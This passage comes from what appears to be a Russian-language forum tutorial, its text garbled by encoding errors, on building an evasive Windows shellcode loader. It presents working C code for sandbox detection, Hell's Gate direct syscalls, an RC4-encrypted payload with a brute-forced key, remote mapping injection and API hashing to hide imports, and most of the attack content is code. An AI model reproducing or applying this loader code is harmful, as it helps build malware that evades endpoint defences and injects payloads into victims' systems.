	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>if (!AntiAnalysis(20000)) {
    printf(&quot;[!] –û–±–Ω–∞—Ä—É–∂–µ–Ω–∞ –≤–∏—Ä—Ç—É–∞–ª—å–Ω–∞—è —Å—Ä–µ–¥–∞\n&quot;);
}</code></pre>
	</div>
</div><br />
–ó–¥–µ—Å—å 20000 –ø—Ä–µ–¥—Å—Ç–∞–≤–ª—è–µ—Ç —Å–æ–±–æ–π –≤—Ä–µ–º—è –º–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥–∞ –∫–ª–∏–∫–æ–≤ –º—ã—à–∏ –≤ –º–∏–ª–ª–∏—Å–µ–∫—É–Ω–¥–∞—Ö.<br />
<br />
<b>NtDelayExecution —á–µ—Ä–µ–∑ Hell&#039;s Gate </b><br />
<br />
Hell&#039;s Gate –º–æ–∂–Ω–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –¥–ª—è –≤—ã–∑–æ–≤–∞ NtDelayExecution, —á—Ç–æ —Ç—Ä–µ–±—É–µ—Ç –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏—è —Å—Ç—Ä—É–∫—Ç—É—Ä—ã VX_TABLE, —Ä–∞—Å–ø–æ–ª–æ–∂–µ–Ω–Ω–æ–π –≤ Common.h, –∏ —Ñ—É–Ω–∫—Ü–∏–∏ InitializeSyscalls –¥–ª—è –¥–æ–±–∞–≤–ª–µ–Ω–∏—è —ç–ª–µ–º–µ–Ω—Ç–∞ VX_TABLE_ENTRY NtDelayExecution –∏ –µ–≥–æ –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏–∏. –ü—Ä–æ–≥—Ä–∞–º–º–µ Hasher —Ç–∞–∫–∂–µ –ø–æ—Ç—Ä–µ–±—É–µ—Ç—Å—è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –¥–ª—è –≤—ã—á–∏—Å–ª–µ–Ω–∏—è —Ö–µ—à–∞ –¥–ª—è —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞, –∫–∞–∫ —ç—Ç–æ –±—ã–ª–æ —Å–¥–µ–ª–∞–Ω–æ –≤ –ø—Ä–µ–¥—ã–¥—É—â–∏—Ö —à–∞–≥–∞—Ö.<br />
<br />
<b>–†–µ–∑—É–ª—å—Ç–∞—Ç—ã –∞–Ω—Ç–∏-–∞–Ω–∞–ª–∏–∑–∞</b><br />
<br />
–ù–∞ —Å–ª–µ–¥—É—é—â–µ–º –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–∏ –ø–æ–∫–∞–∑–∞–Ω —Ä–µ–∑—É–ª—å—Ç–∞—Ç –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è —Ñ—É–Ω–∫—Ü–∏–∏ AntiAnalysis –≤–æ –≤—Ä–µ–º—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746788224836.png"
		data-src="https://osint42.org/attachments/1746788224836-png.265/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746788224836-png.265/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746788224836.png"
			title="1746788224836.png"
			width="1461" height="817" loading="lazy" />
	</div><br />
<br />
<b>–®–∏—Ñ—Ä–æ–≤–∞–Ω–∏–µ –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏</b><br />
<br />
–î–ª—è —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏ –±—É–¥–µ—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω —Ñ–∞–π–ª HellShell.exe. –ö–æ–º–∞–Ω–¥–∞, –∫–æ—Ç–æ—Ä–∞—è –±—É–¥–µ—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å—Å—è, - —ç—Ç–æ .\HellShell.exe calc.bin rc4, –≥–¥–µ calc.bin - —ç—Ç–æ —Ñ–∞–π–ª —Å –Ω–µ–æ–±—Ä–∞–±–æ—Ç–∞–Ω–Ω–æ–π –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–æ–π. –ó–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–Ω–∞—è –ø–æ–ª–µ–∑–Ω–∞—è –Ω–∞–≥—Ä—É–∑–∫–∞ –∑–∞–º–µ–Ω–∏—Ç –ø—Ä–µ–¥—ã–¥—É—â—É—é –Ω–µ—à–∏—Ñ—Ä–æ–≤–∞–Ω–Ω—É—é –ø–æ–ª–µ–∑–Ω—É—é –Ω–∞–≥—Ä—É–∑–∫—É –≤ —Ñ–∞–π–ª–µ main.c.<br />
<br />
–ö—Ä–æ–º–µ —Ç–æ–≥–æ, —Ñ—É–Ω–∫—Ü–∏—è Rc4EncryptionViSystemFunc032, –∫–æ—Ç–æ—Ä–∞—è –æ—Ç–≤–µ—á–∞–µ—Ç –∑–∞ —Ä–∞—Å—à–∏—Ñ—Ä–æ–≤–∫—É, –±—É–¥–µ—Ç —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∞ –≤ —Ñ–∞–π–ª–µ Inject.c.<br />
<br />
<b>–í–∑–ª–æ–º –º–µ—Ç–æ–¥–æ–º –ø–µ—Ä–µ–±–æ—Ä–∞</b><br />
<br />
HellShell.exe –≥–µ–Ω–µ—Ä–∏—Ä—É–µ—Ç —Å–ª–µ–¥—É—é—â–∏–π –∫–ª—é—á.<br />
<br />
unsigned char Rc4Key[] = { 0x61, 0x1A, 0xA0, 0xAA, 0xA7, 0x92, 0x9F, 0xBA, 0x8F, 0xCE, 0x4C, 0xD8, 0x11, 0xFA, 0xED, 0xB9 };<br />
<br />
–ö–ª—é—á –±—É–¥–µ—Ç –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω, –∞ –∑–∞—Ç–µ–º —Ä–∞—Å—à–∏—Ñ—Ä–æ–≤–∞–Ω —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º –º–µ—Ç–æ–¥–∞ –ø–µ—Ä–µ–±–æ—Ä–∞. –°–Ω–∞—á–∞–ª–∞ –∫–ª—é—á –Ω—É–∂–Ω–æ –∑–∞—à–∏—Ñ—Ä–æ–≤–∞—Ç—å. –≠—Ç–æ –±—É–¥–µ—Ç —Å–¥–µ–ª–∞–Ω–æ —Å –ø–æ–º–æ—â—å—é –Ω–æ–≤–æ–≥–æ –ø—Ä–æ–µ–∫—Ç–∞.<br />
–≠—Ç–æ—Ç –Ω–æ–≤—ã–π –ø—Ä–æ–µ–∫—Ç –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–ª–µ–Ω –≤ –∫–æ–¥–µ –¥–∞–Ω–Ω–æ–≥–æ –º–æ–¥—É–ª—è –∏ –Ω–∞–∑—ã–≤–∞–µ—Ç—Å—è KeyGuard2.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746788237738.png"
		data-src="https://osint42.org/attachments/1746788237738-png.266/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746788237738-png.266/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746788237738.png"
			title="1746788237738.png"
			width="1515" height="1000" loading="lazy" />
	</div><br />
<br />
–§—É–Ω–∫—Ü–∏—è Rc4EncryptionViSystemFunc032 –±—É–¥–µ—Ç –æ–±–Ω–æ–≤–ª–µ–Ω–∞, —á—Ç–æ–±—ã –≤–∫–ª—é—á–∏—Ç—å –ª–æ–≥–∏–∫—É –º–µ—Ç–æ–¥–∞ –ø–µ—Ä–µ–±–æ—Ä–∞. –≠—Ç–∞ —Ñ—É–Ω–∫—Ü–∏—è –±—É–¥–µ—Ç –≤—ã–∑—ã–≤–∞—Ç—å—Å—è –∏–∑ RemoteMappingInjectionViaSyscalls.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL Rc4EncryptionViSystemFunc032(IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize) {

    // –†–µ–∑—É–ª—å—Ç–∞—Ç SystemFunction032
    NTSTATUS STATUS = NULL;
    BYTE RealKey[KEY_SIZE] = { 0 };
    int b = 0;

    // –ü–µ—Ä–µ–±–æ—Ä –∫–ª—é—á–∞:
    while (1) {
        // –ò—Å–ø–æ–ª—å–∑—É—è –Ω–∞–º–µ–∫ –±–∞–π—Ç–∞, –µ—Å–ª–∏ —ç—Ç–æ —Ä–∞–≤–Ω–æ, —Ç–æ –º—ã –Ω–∞—à–ª–∏ –∑–Ω–∞—á–µ–Ω–∏–µ &#039;b&#039;, –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ–µ –¥–ª—è —Ä–∞—Å—à–∏—Ñ—Ä–æ–≤–∫–∏ –∫–ª—é—á–∞
        if (((pRc4Key[0] ^ b) - 0) == HINT_BYTE)
            break;
        // –í –ø—Ä–æ—Ç–∏–≤–Ω–æ–º —Å–ª—É—á–∞–µ —É–≤–µ–ª–∏—á–∏–≤–∞–µ–º &#039;b&#039; –∏ –ø—ã—Ç–∞–µ–º—Å—è —Å–Ω–æ–≤–∞
        else
            b++;
    }

    printf(&quot;[i] –†–∞—Å—Å—á–∏—Ç–∞–Ω–Ω–æ–µ –∑–Ω–∞—á–µ–Ω–∏–µ &#039;b&#039; : 0x%0.2X \n&quot;, b);

    // –†–∞—Å—à–∏—Ñ—Ä–æ–≤–∫–∞ –∫–ª—é—á–∞
    for (int i = 0; i &lt; KEY_SIZE; i++) {
        RealKey[i] = (BYTE)((pRc4Key[i] ^ b) - i);
    }

    // –°–æ–∑–¥–∞–Ω–∏–µ 2 –ø–µ—Ä–µ–º–µ–Ω–Ω—ã—Ö —Ç–∏–ø–∞ USTRING, –æ–¥–Ω–∞ –ø–µ—Ä–µ–¥–∞–µ—Ç—Å—è –≤ –∫–∞—á–µ—Å—Ç–≤–µ –∫–ª—é—á–∞, –∞ –¥—Ä—É–≥–∞—è - –≤ –∫–∞—á–µ—Å—Ç–≤–µ –±–ª–æ–∫–∞ –¥–∞–Ω–Ω—ã—Ö –¥–ª—è —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è/—Ä–∞—Å—à–∏—Ñ—Ä–æ–≤–∫–∏
    USTRING Key = { .Buffer = RealKey, .Length = dwRc4KeySize, .MaximumLength = dwRc4KeySize },
            Img = { .Buffer = pPayloadData, .Length = sPayloadSize, .MaximumLength = sPayloadSize };


    // –ü–æ—Å–∫–æ–ª—å–∫—É —Ñ—É–Ω–∫—Ü–∏—è SystemFunction032 —ç–∫—Å–ø–æ—Ä—Ç–∏—Ä—É–µ—Ç—Å—è –∏–∑ Advapi32.dll, –º—ã –∑–∞–≥—Ä—É–∂–∞–µ–º –µ–µ –≤ –ø—Ä–æ—Ü–µ—Å—Å —Å –ø–æ–º–æ—â—å—é Advapi32,
    // –ò –∏—Å–ø–æ–ª—å–∑—É–µ–º –µ–µ –≤–æ–∑–≤—Ä–∞—â–∞–µ–º–æ–µ –∑–Ω–∞—á–µ–Ω–∏–µ –≤ –∫–∞—á–µ—Å—Ç–≤–µ –ø–∞—Ä–∞–º–µ—Ç—Ä–∞ hModule –≤ GetProcAddress
    fnSystemFunction032 SystemFunction032 = (fnSystemFunction032)GetProcAddress(LoadLibraryA(&quot;Advapi32&quot;), &quot;SystemFunction032&quot;);

    // –ï—Å–ª–∏ –≤—ã–∑–æ–≤—ã SystemFunction032 –∑–∞–≤–µ—Ä—à–∞—é—Ç—Å—è –Ω–µ—É–¥–∞—á–Ω–æ, –æ–Ω–∏ –≤–µ—Ä–Ω—É—Ç –Ω–µ–Ω—É–ª–µ–≤–æ–µ –∑–Ω–∞—á–µ–Ω–∏–µ
    if ((STATUS = SystemFunction032(&amp;Img, &amp;Key)) != 0x0) {
        printf(&quot;[!] –û–®–ò–ë–ö–ê SystemFunction032 : 0x%0.8X\n&quot;, STATUS);
        return FALSE;
    }

    return TRUE;
}
}</code></pre>
	</div>
</div><br />
<b>–†–µ–∑—É–ª—å—Ç–∞—Ç—ã –≤–∑–ª–æ–º–∞ –º–µ—Ç–æ–¥–æ–º –ø–µ—Ä–µ–±–æ—Ä–∞</b><br />
<br />
–í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏ (—Ñ—É–Ω–∫—Ü–∏–∏ –∞–Ω—Ç–∏-–∞–Ω–∞–ª–∏–∑–∞ –æ—Ç–∫–ª—é—á–µ–Ω—ã).<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746788250754.png"
		data-src="https://osint42.org/attachments/1746788250754-png.267/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746788250754-png.267/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746788250754.png"
			title="1746788250754.png"
			width="1604" height="580" loading="lazy" />
	</div><br />
<br />
<b>–•—ç—à–∏—Ä–æ–≤–∞–Ω–∏–µ API</b><br />
<br />
–î–æ —Å–∏—Ö –ø–æ—Ä –≤—Å–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–Ω—ã–µ WinAPI –≤—ã–∑—ã–≤–∞–ª–∏—Å—å –Ω–∞–ø—Ä—è–º—É—é, —á—Ç–æ –æ–∑–Ω–∞—á–∞–µ—Ç, —á—Ç–æ –∏—Ö –º–æ–∂–Ω–æ –Ω–∞–π—Ç–∏ –≤ IAT —Ä–µ–∞–ª–∏–∑–∞—Ü–∏–∏. –ß—Ç–æ–±—ã —Ä–µ—à–∏—Ç—å —ç—Ç—É –ø—Ä–æ–±–ª–µ–º—É, —Å–æ–∑–¥–∞–µ—Ç—Å—è –Ω–æ–≤—ã–π —Ñ–∞–π–ª, ApiHashing.c, –∫–æ—Ç–æ—Ä—ã–π —Å–æ–¥–µ—Ä–∂–∏—Ç –Ω–µ–æ–±—Ö–æ–¥–∏–º—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏ –¥–ª—è —Ä–µ–∞–ª–∏–∑–∞—Ü–∏–∏ —Ö—ç—à–∏—Ä–æ–≤–∞–Ω–∏—è API.<br />
<br />
ApiHashing.c<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>#include &lt;Windows.h&gt;
#include &quot;Structs.h&quot;
#include &quot;Common.h&quot;

FARPROC GetProcAddressH(HMODULE hModule, DWORD dwApiNameHash) {

    if (hModule == NULL || dwApiNameHash == NULL)
        return NULL;

    PBYTE pBase = (PBYTE)hModule;

    PIMAGE_DOS_HEADER       pImgDosHdr       = (PIMAGE_DOS_HEADER)pBase;
    if (pImgDosHdr-&gt;e_magic != IMAGE_DOS_SIGNATURE)
        return NULL;

    PIMAGE_NT_HEADERS       pImgNtHdrs       = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr-&gt;e_lfanew);
    if (pImgNtHdrs-&gt;Signature != IMAGE_NT_SIGNATURE)
        return NULL;

    IMAGE_OPTIONAL_HEADER   ImgOptHdr        = pImgNtHdrs-&gt;OptionalHeader;
    PIMAGE_EXPORT_DIRECTORY pImgExportDir    = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    PDWORD            FunctionNameArray       = (PDWORD)(pBase + pImgExportDir-&gt;AddressOfNames);
    PDWORD            FunctionAddressArray    = (PDWORD)(pBase + pImgExportDir-&gt;AddressOfFunctions);
    PWORD            FunctionOrdinalArray    = (PWORD)(pBase + pImgExportDir-&gt;AddressOfNameOrdinals);

    for (DWORD i = 0; i &lt; pImgExportDir-&gt;NumberOfFunctions; i++) {
        CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]);
        PVOID    pFunctionAddress = (PVOID)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);

        // –•—ç—à–∏—Ä—É–µ–º –∫–∞–∂–¥–æ–µ –∏–º—è —Ñ—É–Ω–∫—Ü–∏–∏ `pFunctionName`
        // –ï—Å–ª–∏ –æ–±–∞ —Ö—ç—à–∞ —Ä–∞–≤–Ω—ã, —Ç–æ –º—ã –Ω–∞—à–ª–∏ –Ω—É–∂–Ω—É—é —Ñ—É–Ω–∫—Ü–∏—é
        if (dwApiNameHash == HASHA(pFunctionName)) {
            return pFunctionAddress;
        }
    }

    return NULL;
}

HMODULE GetModuleHandleH(DWORD dwModuleNameHash) {

    if (dwModuleNameHash == NULL)
        return NULL;

#ifdef _WIN64
    PPEB            pPeb = (PEB*)(__readgsqword(0x60));
#elif _WIN32
    PPEB            pPeb = (PEB*)(__readfsdword(0x30));
#endif

    PPEB_LDR_DATA            pLdr = (PPEB_LDR_DATA)(pPeb-&gt;Ldr);
    PLDR_DATA_TABLE_ENTRY    pDte = (PLDR_DATA_TABLE_ENTRY)(pLdr-&gt;InMemoryOrderModuleList.Flink);

    while (pDte) {

        if (pDte-&gt;FullDllName.Length != NULL &amp;&amp; pDte-&gt;FullDllName.Length &lt; MAX_PATH) {

            // –ü—Ä–µ–æ–±—Ä–∞–∑–æ–≤–∞–Ω–∏–µ `FullDllName.Buffer` –≤ —Å—Ç—Ä–æ–∫—É –≤–µ—Ä—Ö–Ω–µ–≥–æ —Ä–µ–≥–∏—Å—Ç—Ä–∞
            CHAR UpperCaseDllName[MAX_PATH];

            DWORD i = 0;
            while (pDte-&gt;FullDllName.Buffer[i]) {
                UpperCaseDllName[i] = (CHAR)toupper(pDte-&gt;FullDllName.Buffer[i]);
                i++;
            }
            UpperCaseDllName[i] = &#039;\0&#039;;

            // –•—ç—à–∏—Ä—É–µ–º `UpperCaseDllName` –∏ —Å—Ä–∞–≤–Ω–∏–≤–∞–µ–º –∑–Ω–∞—á–µ–Ω–∏–µ —Ö—ç—à–∞ —Å –≤—Ö–æ–¥–Ω—ã–º `dwModuleNameHash`
            if (HASHA(UpperCaseDllName) == dwModuleNameHash)
                return (HMODULE)(pDte-&gt;InInitializationOrderLinks.Flink);
        }
        else {
            break;
        }

        pDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);
    }

    return NULL;
}</code></pre>
	</div>
</div><br />
<b>–§–∞–π–ª –∑–∞–≥–æ–ª–æ–≤–∫–∞</b><br />
<br />
–ü–µ—Ä–µ–¥ –ø—Ä–æ–¥–æ–ª–∂–µ–Ω–∏–µ–º –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ —Å–æ–∑–¥–∞—Ç—å –Ω–æ–≤—ã–π —Ñ–∞–π–ª –∑–∞–≥–æ–ª–æ–≤–∫–∞, typedef.h, —á—Ç–æ–±—ã –æ–ø—Ä–µ–¥–µ–ª–∏—Ç—å –∏—Å–ø–æ–ª—å–∑—É–µ–º—ã–µ WinAPI –≤ –≤–∏–¥–µ —É–∫–∞–∑–∞—Ç–µ–ª–µ–π –Ω–∞ —Ñ—É–Ω–∫—Ü–∏–∏ –¥–ª—è —è—Å–Ω–æ—Å—Ç–∏ –∏ –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç–∏ –ø–æ–¥–¥–µ—Ä–∂–∫–∏. Common.h –±—É–¥–µ—Ç –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –≤–∫–ª—é—á–∏—Ç—å —Ñ–∞–π–ª –∑–∞–≥–æ–ª–æ–≤–∫–∞ typedef.h —Å –ø–æ–º–æ—â—å—é #include &quot;typedef.h&quot;.<br />
<br />
typedef.h<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>#pragma once
#include &lt;Windows.h&gt;
typedef ULONGLONG(WINAPI* fnGetTickCount64)();

typedef HANDLE(WINAPI* fnOpenProcess)(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);

typedef LRESULT(WINAPI* fnCallNextHookEx)(HHOOK hhk, int nCode, WPARAM wParam, LPARAM lParam);

typedef HHOOK(WINAPI* fnSetWindowsHookExW)(int idHook, HOOKPROC lpfn, HINSTANCE hmod, DWORD dwThreadId);

typedef BOOL(WINAPI* fnGetMessageW)(LPMSG lpMsg, HWND hWnd, UINT wMsgFilterMin, UINT wMsgFilterMax);

typedef LRESULT(WINAPI* fnDefWindowProcW)(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam);

typedef BOOL(WINAPI* fnUnhookWindowsHookEx)(HHOOK hhk);

typedef DWORD(WINAPI* fnGetModuleFileNameW)(HMODULE hModule, LPWSTR lpFilename, DWORD nSize);

typedef HANDLE(WINAPI* fnCreateFileW)(LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);

typedef BOOL(WINAPI* fnSetFileInformationByHandle)(HANDLE hFile, FILE_INFO_BY_HANDLE_CLASS FileInformationClass, LPVOID lpFileInformation, DWORD dwBufferSize);

typedef BOOL(WINAPI* fnCloseHandle)(HANDLE hObject);</code></pre>
	</div>
</div><br />
<b>–°—Ç—Ä—É–∫—Ç—É—Ä–∞ API_HASHING</b><br />
<br />
–î–∞–ª–µ–µ –≤ Common.h –æ–ø—Ä–µ–¥–µ–ª—è–µ—Ç—Å—è –Ω–æ–≤–∞—è —Å—Ç—Ä—É–∫—Ç—É—Ä–∞ API_HASHING, –∫–æ—Ç–æ—Ä–∞—è –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è —Ö—Ä–∞–Ω–µ–Ω–∏—è –∞–¥—Ä–µ—Å–æ–≤ –∏—Å–ø–æ–ª—å–∑—É–µ–º—ã—Ö WinAPI, –¥–µ–ª–∞—è –∏—Ö –±–æ–ª–µ–µ –¥–æ—Å—Ç—É–ø–Ω—ã–º–∏ –¥–ª—è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è –≤ —Ñ—É–Ω–∫—Ü–∏—è—Ö —Ä–µ–∞–ª–∏–∑–∞—Ü–∏–∏.<br />
<br />
Common.h<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>typedef struct _API_HASHING {

    fnGetTickCount64                pGetTickCount64;
    fnOpenProcess                   pOpenProcess;
    fnCallNextHookEx                pCallNextHookEx;
    fnSetWindowsHookExW             pSetWindowsHookExW;
    fnGetMessageW                   pGetMessageW;
    fnDefWindowProcW                pDefWindowProcW;
    fnUnhookWindowsHookEx           pUnhookWindowsHookEx;
    fnGetModuleFileNameW            pGetModuleFileNameW;
    fnCreateFileW                   pCreateFileW;
    fnSetFileInformationByHandle    pSetFileInformationByHandle;
    fnCloseHandle                   pCloseHandle;

} API_HASHING, *PAPI_HASHING;</code></pre>
	</div>
</div><br />
<b>–û–±–Ω–æ–≤–ª–µ–Ω–∏–µ VX_Table </b><br />
<br />
–§—É–Ω–∫—Ü–∏–∏ GetModuleHandleH –∏ GetProcAddressH –¥–æ–ª–∂–Ω—ã –±—ã—Ç—å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω—ã –¥–ª—è –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏–∏ —ç–ª–µ–º–µ–Ω—Ç–æ–≤ —Å—Ç—Ä—É–∫—Ç—É—Ä—ã API_HASHING. –ó–∞—Ç–µ–º —Ñ—É–Ω–∫—Ü–∏—è InitializeSyscalls –∏—Å–ø–æ–ª—å–∑—É–µ—Ç —ç—Ç–∏ —Ñ—É–Ω–∫—Ü–∏–∏ –¥–ª—è –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏–∏ —Å—Ç—Ä—É–∫—Ç—É—Ä—ã VX_TABLE, –∫–æ—Ç–æ—Ä–∞—è –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è –≤—ã–∑–æ–≤–∞ syscalls.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>// ...

API_HASHING g_Api = {0};

BOOL InitializeSyscalls() {

// –ü–æ–ª—É—á–∏—Ç—å PEB
PTEB pCurrentTeb = RtlGetThreadEnvironmentBlock();
PPEB pCurrentPeb = pCurrentTeb-&gt;ProcessEnvironmentBlock;
if (!pCurrentPeb || !pCurrentTeb || pCurrentPeb-&gt;OSMajorVersion != 0xA)
    return FALSE;

// –ü–æ–ª—É—á–∏—Ç—å –º–æ–¥—É–ª—å NTDLL
PLDR_DATA_TABLE_ENTRY pLdrDataEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pCurrentPeb-&gt;Ldr-&gt;InMemoryOrderModuleList.Flink-&gt;Flink - 0x10);

// –ü–æ–ª—É—á–∏—Ç—å EAT –∏–∑ NTDLL
PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL;
if (!GetImageExportDirectory(pLdrDataEntry-&gt;DllBase, &amp;pImageExportDirectory) || pImageExportDirectory == NULL)
    return FALSE;

g_Sys.NtCreateSection.uHash          = NtCreateSection_JOAA;
g_Sys.NtMapViewOfSection.uHash       = NtMapViewOfSection_JOAA;
g_Sys.NtUnmapViewOfSection.uHash     = NtUnmapViewOfSection_JOAA;
g_Sys.NtClose.uHash                  = NtClose_JOAA;
g_Sys.NtCreateThreadEx.uHash         = NtCreateThreadEx_JOAA;
g_Sys.NtWaitForSingleObject.uHash    = NtWaitForSingleObject_JOAA;
g_Sys.NtQuerySystemInformation.uHash = NtQuerySystemInformation_JOAA;
g_Sys.NtDelayExecution.uHash         = NtDelayExecution_JOAA;

// –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä–æ–≤–∞—Ç—å syscalls
if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;g_Sys.NtCreateSection))
    return FALSE;
if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;g_Sys.NtMapViewOfSection))
    return FALSE;
if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;g_Sys.NtUnmapViewOfSection))
    return FALSE;
if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;g_Sys.NtClose))
    return FALSE;
if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;g_Sys.NtCreateThreadEx))
    return FALSE;
if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;g_Sys.NtWaitForSingleObject))
    return FALSE;
if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;g_Sys.NtQuerySystemInformation))
    return FALSE;
if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;g_Sys.NtDelayExecution))
    return FALSE;

// –≠–∫—Å–ø–æ—Ä—Ç–∏—Ä–æ–≤–∞–Ω–Ω—ã–π User32.dll
g_Api.pCallNextHookEx      = (fnCallNextHookEx)GetProcAddressH(GetModuleHandleH(USER32DLL_JOAA), CallNextHookEx_JOAA);
g_Api.pDefWindowProcW      = (fnDefWindowProcW)GetProcAddressH(GetModuleHandleH(USER32DLL_JOAA), DefWindowProcW_JOAA);
g_Api.pGetMessageW         = (fnGetMessageW)GetProcAddressH(GetModuleHandleH(USER32DLL_JOAA), GetMessageW_JOAA);
g_Api.pSetWindowsHookExW   = (fnSetWindowsHookExW)GetProcAddressH(GetModuleHandleH(USER32DLL_JOAA), SetWindowsHookExW_JOAA);
